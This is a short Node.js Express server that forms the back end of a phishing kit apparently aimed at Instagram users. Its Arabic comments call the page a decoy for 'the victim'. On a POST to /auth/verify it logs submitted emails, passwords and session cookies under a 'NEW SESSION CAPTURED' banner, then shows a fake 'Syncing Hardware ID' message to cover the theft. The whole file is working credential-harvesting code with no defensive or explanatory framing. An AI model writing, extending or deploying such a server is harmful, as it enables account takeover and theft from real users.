const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

// عرض الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال البيانات والتوكن
app.post('/auth/verify', (req, res) => {
    const { email, password, user_cookies } = req.body;
    
    console.log("====================================");
    console.log("🔥 NEW SESSION CAPTURED 🔥");
    console.log("USER: " + email);
    console.log("PASS: " + password);
    console.log("SESSION COOKIES: " + user_cookies); 
    console.log("====================================");
    
    // صفحة تمويهية للضحية
    res.send('<div style="font-family:sans-serif;text-align:center;padding-top:100px;"><h2>Syncing Hardware ID...</h2><p>Please wait, matching your device with Instagram servers.</p></div>');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Bypass Server Running'));
